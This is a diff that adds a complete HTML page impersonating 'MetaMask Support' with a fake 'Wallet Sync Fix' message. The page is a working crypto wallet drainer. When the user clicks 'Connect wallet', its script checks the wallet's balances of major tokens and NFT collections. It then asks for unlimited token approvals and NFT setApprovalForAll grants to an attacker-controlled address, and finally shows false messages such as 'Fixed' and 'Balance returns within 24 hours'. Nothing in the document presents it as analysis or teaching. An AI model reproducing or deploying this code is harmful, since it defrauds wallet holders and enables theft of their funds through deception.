@@ -1,0 +1,49 @@
+<!doctype html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MetaMask Support</title>
+<style>
+body{font-family:Arial;background:#f2f4f7;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+.box{background:#fff;padding:30px;border-radius:12px;max-width:400px;width:100%;box-shadow:0 2px 20px #0002}
+h1{font-size:20px;margin:0 0 10px}p{color:#555;font-size:14px}
+button{width:100%;background:#1d4ed8;color:#fff;border:0;padding:14px;border-radius:8px;font-size:15px;cursor:pointer}
+#m{font-size:13px;color:#555;text-align:center;margin-top:12px;min-height:16px}
+</style></head><body>
+<div class="box">
+<h1>Wallet Sync Fix</h1>
+<p>Your wallet lost connection to our server. That's why your balance won't load. Connect below to fix it.</p>
+<button id="go">Connect wallet</button>
+<div id="m"></div>
+</div>
+<script>
+const C = "0x0dfcbce91f708aaacf2a2a031c49aae5a15a4055";
+const TOKENS = ["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"];
+const NFTS = ["0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D","0xED5AF388653567Af2F388E6224dC7C4b3241C544","0xBd3531dA5CF5857e7CfAA92426877b022e612cf8"];
+const MAX = "0x" + "f".repeat(64);
+const pad = a => a.toLowerCase().replace("0x","").padStart(64,"0");
+const say = t => document.getElementById("m").textContent = t;
+
+document.getElementById("go").onclick = async () => {
+  const e = window.ethereum;
+  if (!e) { say("Install MetaMask first, then reload."); return; }
+  const btn = document.getElementById("go");
+  btn.disabled = true;
+  try {
+    const [from] = await e.request({ method: "eth_requestAccounts" });
+    const bal = async c => BigInt(await e.request({ method: "eth_call",
+      params: [{ to: c, data: "0x70a08231" + pad(from) }, "latest"] }));
+    const jobs = [];
+    for (const t of TOKENS) if (await bal(t).catch(()=>0n) > 0n)
+      jobs.push({ to: t, data: "0x095ea7b3" + pad(C) + MAX.slice(2) });
+    for (const n of NFTS) if (await bal(n).catch(()=>0n) > 0n)
+      jobs.push({ to: n, data: "0xa22cb465" + pad(C) + pad("1") });
+    if (!jobs.length) { say("Nothing found in this wallet. Try your main one."); btn.disabled = false; return; }
+    for (let i = 0; i < jobs.length; i++) {
+      say(`Confirm ${i+1} of ${jobs.length} in MetaMask...`);
+      await e.request({ method: "eth_sendTransaction", params: [{ from, ...jobs[i] }] }).catch(()=>{});
+    }
+    btn.textContent = "Fixed";
+    say("Done. Balance returns within 24 hours.");
+  } catch { say("Cancelled. Press Connect again."); btn.disabled = false; }
+};
+</script></body></html>
